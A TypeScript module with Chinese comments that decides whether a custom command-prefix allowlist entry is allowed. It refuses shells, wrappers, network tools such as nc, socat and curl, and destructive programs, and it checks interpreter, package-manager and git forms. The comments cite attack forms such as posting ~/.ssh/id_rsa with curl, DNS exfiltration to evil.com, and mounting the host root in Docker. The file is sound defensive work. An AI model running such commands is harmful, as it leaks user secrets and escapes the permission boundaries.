/**
 * 自定义命令白名单条目的准入规则（docs/design/13-permissions.md「只读命令白名单」）。
 *
 * 白名单按**前缀**匹配：条目放行「条目的词 + 之后任意参数」。所以判断一个条目能不能加，
 * 要看「在它后面再接任意参数」会变成什么：`curl https://a.b` 后接 `-d @~/.ssh/id_rsa` 就是外发；
 * `python -u` 后接 `-c "…"` 就是任意代码；`docker run hello-world` 后接 `-v /:/h` 就挂进了整个
 * 主机。规则按程序分类（{@link ALLOWLIST_PROGRAM_RULES}），一条总原则：
 *
 * > 条目里必须已经**固定下了要执行的东西**（具体脚本 / 具体子命令），且固定下来的部分本身不
 * > 含加载代码、联网、改配置的参数；之后追加的参数只能交给这个已固定的东西。
 *
 * - `never`：任何形式都拒绝——shell、包装器、按需下载执行、联网、删改、以及参数决定一切的
 *   程序（awk / sed / tar / docker / kubectl / gh / make …：没有「安全的前缀」，换一个参数就是
 *   执行命令、挂载主机或联网）；
 * - `interpreter`：必须带一个具体脚本（第一个非选项词，不能是 `-`、URL 或 `npm:` 这类说明符）；
 *   脚本之前的选项只能是无害的少数几个（`python -u`、`node --no-warnings`），其余选项（`-c`
 *   `-e` `-m` `-r` `--import` `--require` `--loader` …）一律拒绝；脚本之后的参数交给脚本；
 * - `package-manager`：动词取**第一个非选项词**；只有选项的前缀拒绝（`npm --silent` 之后可接
 *   `exec <包>`）；下载 / 安装 / 执行任意包的动词任何形式拒绝；`run` 类动词后面必须再跟具体脚本；
 *   动词之前的选项只允许无害的少数几个；
 * - `git`：必须带子命令；全局选项（`-c`、`-C` …）拒绝；改配置、联网、跑外部程序的子命令拒绝。
 *
 * core（`AllowlistService.add`）与渲染端（审批卡「加入白名单」的建议与预检）共用这一份规则；
 * 内置条目不经这里（它们在 core 里逐条审过，另有形状测试）。
 */

type ProgramRule = 'never' | 'interpreter' | 'package-manager' | 'git';

const NEVER = [
  // Shells（`bash x.sh` 也等于执行一段任意脚本）
  'bash', 'sh', 'zsh', 'fish', 'dash', 'ksh', 'csh', 'tcsh', 'ash', 'busybox',
  'powershell', 'pwsh', 'cmd',
  // 包装器：后面接什么就执行什么
  'env', 'sudo', 'doas', 'su', 'xargs', 'nohup', 'timeout', 'nice', 'ionice', 'command',
  'exec', 'eval', 'builtin', 'time', 'watch', 'setsid', 'stdbuf', 'unbuffer', 'chroot',
  'nsenter', 'script', 'parallel', 'flock', 'strace', 'ltrace', 'gdb',
  // 按需下载并执行
  'npx', 'pnpx', 'bunx', 'uvx', 'pipx',
  // 联网（含 DNS：`dig <数据>.evil.com` 也是外发）
  'curl', 'wget', 'ssh', 'scp', 'sftp', 'rsync', 'nc', 'ncat', 'netcat', 'socat', 'telnet',
  'ftp', 'dig', 'nslookup', 'host', 'ping', 'traceroute', 'whois', 'openssl',
  // 破坏性 / 改权限
  'rm', 'rmdir', 'mv', 'cp', 'dd', 'chmod', 'chown', 'chgrp', 'ln', 'truncate', 'shred',
  'mkfs', 'install',
  // 参数决定一切：awk `system()`、GNU sed `e`、tar `--to-command` / `--checkpoint-action`、
  // docker / podman `run -v /:/h`、kubectl `exec`、gh `api`、make `--eval` / 任意目标、
  // 编辑器与 man（`-P` 指定的分页程序会被执行）——没有安全的前缀
  'awk', 'gawk', 'mawk', 'nawk', 'sed', 'gsed', 'tar', 'bsdtar', 'gtar',
  'docker', 'podman', 'nerdctl', 'kubectl', 'helm', 'gh', 'make', 'gmake', 'cmake', 'ninja',
  'vim', 'vi', 'nvim', 'emacs', 'nano', 'man',
  // Windows（PowerShell 命令名不区分大小写，按小写比较）
  'invoke-expression', 'iex', 'start-process', 'invoke-webrequest', 'iwr',
  'invoke-restmethod', 'irm', 'remove-item', 'del', 'erase', 'rd', 'set-content',
  'out-file', 'copy-item', 'move-item', 'start-job', 'invoke-command', 'icm',
];

const INTERPRETERS = [
  'python', 'node', 'nodejs', 'deno', 'ruby', 'perl', 'php', 'lua', 'luajit',
  'tclsh', 'rscript', 'osascript', 'java', 'jshell',
];

const PACKAGE_MANAGERS = [
  'npm', 'pnpm', 'yarn', 'bun', 'pip', 'uv', 'poetry', 'cargo', 'go', 'gem',
  'bundle', 'composer', 'corepack',
];

/** 程序（{@link allowlistProgramKey} 归一后的名字）→ 准入规则；不在表里的程序按普通程序处理。 */
export const ALLOWLIST_PROGRAM_RULES: ReadonlyMap<string, ProgramRule> = new Map<string, ProgramRule>([
  ...NEVER.map((name) => [name, 'never'] as const),
  ...INTERPRETERS.map((name) => [name, 'interpreter'] as const),
  ...PACKAGE_MANAGERS.map((name) => [name, 'package-manager'] as const),
  ['git', 'git'],
]);

/** 解释器在脚本之前允许出现的选项（不加载代码、不读 stdin、不改搜索路径）。 */
const SAFE_INTERPRETER_FLAGS: ReadonlySet<string> = new Set([
  // python
  '-u', '-B', '-O', '-OO', '-q', '-s', '-E', '-b', '-bb',
  // node / deno（deno 的 run 子命令另算）
  '--no-warnings', '--no-deprecation', '--trace-warnings', '--trace-deprecation',
  '--enable-source-maps', '--trace-uncaught',
  // perl / ruby（`-W` 不在表里：python 的 -W 要吃掉下一个词作值）
  '-w', '--verbose',
]);

/** 解释器自己的子命令（deno / bun 式）：执行任意代码或下载的拒绝，`run` 后面要再跟脚本。 */
const INTERPRETER_CODE_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'eval', 'repl', 'install', 'compile', 'upgrade', 'x',
]);

/** 包管理器「下载 / 安装 / 执行任意包」的动词：任何形式都拒绝。 */
const PM_DOWNLOAD_EXEC_VERBS: ReadonlySet<string> = new Set([
  'exec', 'x', 'dlx', 'create', 'init', 'install', 'i', 'in', 'add', 'ci', 'update', 'upgrade',
  'up', 'get', 'tool', 'explore', 'shell', 'global', 'link', 'patch', 'publish', 'env',
  'download', 'wheel',
]);

/** 包管理器「运行脚本」的动词：后面必须再跟具体脚本名（`npm run build`）。 */
const PM_RUN_VERBS: ReadonlySet<string> = new Set(['run', 'run-script', 'rum', 'urn']);

/** 包管理器动词之前允许出现的选项。 */
const SAFE_PM_FLAGS: ReadonlySet<string> = new Set([
  '-s', '--silent', '-q', '--quiet', '--no-color', '--color=false', '--verbose',
]);

/** git 子命令：改配置、联网、跑外部程序、改写历史的不能作为前缀条目。 */
const GIT_REFUSED_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'config', 'submodule', 'filter-branch', 'bisect', 'rebase', 'difftool', 'mergetool',
  'instaweb', 'daemon', 'shell', 'upload-pack', 'receive-pack', 'archive',
  'push', 'fetch', 'pull', 'clone', 'ls-remote', 'remote', 'send-email', 'request-pull',
  'credential', 'svn', 'p4', 'cvsimport', 'web--browse', 'help',
]);

/** 命令名的比较形式：去目录、去 Windows 可执行扩展名、小写；`python3.12` 归为 `python`。 */
export function allowlistProgramKey(word: string): string {
  const base = (word.split(/[\\/]/).pop() ?? word).toLowerCase();
  const stripped = base.replace(/\.(exe|cmd|bat|ps1|com)$/, '');
  if (/^python[0-9.]*$/.test(stripped)) return 'python';
  if (/^pip[0-9.]*$/.test(stripped)) return 'pip';
  return stripped;
}

const isFlag = (word: string) => word.startsWith('-');

/** URL 或 `npm:` / `jsr:` 一类说明符（下载执行）；Windows 盘符路径不算。 */
const isRemoteSpecifier = (word: string) =>
  /^[a-z][a-z0-9+.-]*:/i.test(word) && !/^[a-z]:[\\/]/i.test(word);

/**
 * 自定义白名单条目为什么不能添加（可以添加 = null）。规则见文件头与
 * {@link ALLOWLIST_PROGRAM_RULES}；另外空条目、含 shell 结构字符（管道、重定向、替换、换行）
 * 的条目一律拒绝。
 */
export function allowlistPatternRefusal(pattern: string): string | null {
  const trimmed = pattern.trim();
  if (trimmed.length === 0) return '条目不能为空';
  if (/[|&;<>()`$\n\r]/.test(trimmed)) {
    return '条目只能是命令前缀，不能含管道、重定向、替换或多条命令';
  }
  const words = trimmed.split(/\s+/);
  const first = words[0] ?? '';
  const rule = ALLOWLIST_PROGRAM_RULES.get(allowlistProgramKey(first));
  const rest = words.slice(1);
  switch (rule) {
    case 'never':
      return `「${first}」可以执行任意命令、联网、删改文件，或者换一个参数就会这样，不能加入白名单（需要时逐次确认）`;
    case 'interpreter':
      return interpreterRefusal(first, rest);
    case 'package-manager':
      return packageManagerRefusal(first, rest);
    case 'git':
      return gitRefusal(rest);
    default:
      return null;
  }
}

function interpreterRefusal(first: string, rest: readonly string[]): string | null {
  const scriptIndex = rest.findIndex((word) => !isFlag(word));
  for (const flag of scriptIndex < 0 ? rest : rest.slice(0, scriptIndex)) {
    if (!SAFE_INTERPRETER_FLAGS.has(flag)) {
      return `「${first} ${flag}」可能加载或就地执行代码，不能加入白名单`;
    }
  }
  if (scriptIndex < 0) {
    return `「${first}」的条目必须写到具体脚本（如 ${first} scripts/check.py）：只有选项的前缀之后可以接 -c / -e 执行任意代码`;
  }
  const script = rest[scriptIndex]!;
  if (isRemoteSpecifier(script)) return `「${script}」会从网络取代码执行，不能加入白名单`;
  const sub = script.toLowerCase();
  if (INTERPRETER_CODE_SUBCOMMANDS.has(sub)) {
    return `「${first} ${script}」会就地执行或下载代码，不能加入白名单`;
  }
  if (PM_RUN_VERBS.has(sub) || sub === 'test' || sub === 'task') {
    // deno / bun 式子命令：后面还要一个具体脚本，且同样不能是远程说明符。
    const next = rest.slice(scriptIndex + 1);
    const target = next.find((word) => !isFlag(word));
    if (target === undefined) return `「${first} ${script}」后面要写具体脚本`;
    if (next.slice(0, next.indexOf(target)).some((flag) => !SAFE_INTERPRETER_FLAGS.has(flag))) {
      return `「${first} ${script}」的选项可能放开权限或加载代码，不能加入白名单`;
    }
    if (isRemoteSpecifier(target)) return `「${target}」会从网络取代码执行，不能加入白名单`;
  }
  return null;
}

function packageManagerRefusal(first: string, rest: readonly string[]): string | null {
  const verbIndex = rest.findIndex((word) => !isFlag(word));
  for (const flag of verbIndex < 0 ? rest : rest.slice(0, verbIndex)) {
    if (!SAFE_PM_FLAGS.has(flag)) {
      return `「${first} ${flag}」可能改变包管理器加载的代码或配置，不能加入白名单`;
    }
  }
  if (verbIndex < 0) {
    return `「${first}」的条目必须写到具体子命令（如 ${first} test）：只有选项的前缀之后可以接 exec / install 等任意动词`;
  }
  const verb = rest[verbIndex]!.toLowerCase();
  if (PM_DOWNLOAD_EXEC_VERBS.has(verb)) {
    return `「${first} ${rest[verbIndex]}」会下载、安装或执行任意包，不能加入白名单`;
  }
  if (PM_RUN_VERBS.has(verb)) {
    const script = rest.slice(verbIndex + 1).find((word) => !isFlag(word));
    if (script === undefined) {
      return `「${first} ${rest[verbIndex]}」后面接什么脚本都会执行，请写到具体脚本（如 ${first} ${rest[verbIndex]} build）`;
    }
    // `go run github.com/x/y@latest`、`uv run https://…`：下载后执行。
    if (isRemoteSpecifier(script) || script.includes('@')) {
      return `「${script}」会下载后执行，不能加入白名单`;
    }
  }
  return null;
}

function gitRefusal(rest: readonly string[]): string | null {
  const sub = rest[0];
  if (sub === undefined) {
    return '裸写的「git」等于放行所有 git 操作（含推送与改写历史），请写到具体子命令（如 git status）';
  }
  if (isFlag(sub)) return `「git ${sub}」会改变 git 的配置或执行位置，不能加入白名单`;
  if (GIT_REFUSED_SUBCOMMANDS.has(sub.toLowerCase())) {
    return `「git ${sub}」会改配置、联网或运行外部程序，不能加入白名单`;
  }
  return null;
}
